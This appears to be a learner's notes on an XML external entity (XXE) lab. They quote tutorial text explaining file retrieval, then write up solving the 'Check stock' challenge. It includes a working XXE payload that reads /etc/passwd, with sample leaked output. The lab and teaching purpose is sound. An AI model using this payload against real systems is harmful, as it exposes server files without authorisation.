## Exploiting XXE to retrieve Files

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

- Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.
- Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the `/etc/passwd` file by submitting the following XXE payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>
```

This XXE payload defines an external entity `&xxe;` whose value is the contents of the `/etc/passwd` file and uses the entity within the `productId` value. This causes the application's response to include the contents of the file:

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...
```

## Challenge

> This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
> To solve the lab, inject an XML external entity to retrieve the contents of the `/etc/passwd` file.

--> i intercepted the check stock request and added this before `<stockcheck>` tag:

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

--> Also i added `&xxe;` before both tags before i don't know which one is vulnerable :

--> And i got the content of `/etc/passwd`
